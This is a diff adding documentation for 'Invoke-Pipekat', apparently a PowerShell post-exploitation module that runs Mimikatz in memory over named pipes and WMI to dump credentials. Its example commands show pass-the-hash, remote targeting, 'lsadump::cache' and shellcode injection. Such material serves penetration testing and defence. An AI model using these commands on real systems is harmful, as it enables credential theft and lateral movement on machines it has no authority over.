@@ -1,0 +1,38 @@
+################
+Invoke-Pipekat
+################
+*********
+SYNOPSIS
+*********
+The Invoke-Pipekat module uses Named Pipes and WMI to extract credentials using the famous @gentilkiwi tool and Invoke-WMIExec from @kevin_robertson.
+
+* Ben Turner @benpturner
+
+************
+DESCRIPTION
+************
+When you are running as a low-level user but have obtained highly privileged credntials and you want to extract credentials from memory or use any of the features of the famous tool from @gentilkiwi without touching disk or loading from an external source. This uses named pipes to communicate between process and then uses WMI to elevate up on the localhost using the supplied credentials. Default timeout 30 seconds for the clinet pipe and 600 seconds for the server pipe.
+
+*********
+EXAMPLES
+*********
+.. code-block:: powershell
+
+	Invoke-Pipekat -Username Admin -Password Password1 -Domain .
+
+.. code-block:: powershell
+
+	Invoke-Pipekat -Target 10.0.0.100 -Username Admin -Password Password1 -Domain .
+
+.. code-block:: powershell
+
+	Invoke-Pipekat -Username Admin -Password Password1 -Domain . -Command "lsadump::cache" -PSexec $True
+
+.. code-block:: powershell
+
+	Invoke-Pipekat -Username Admin -Hash 4E3254E32556AE56AE -Domain . -Command "lsadump::cache" -PSexec $True
+
+.. code-block:: powershell
+
+	Invoke-Pipekat -Target 10.0.0.1 -Username Admin -Hash 4E3254E32556AE56AE -Domain . -Shellcode ZnVuY3Rpb24gSW52b2tlL -Timeout 15 -TimeoutServer 900
+
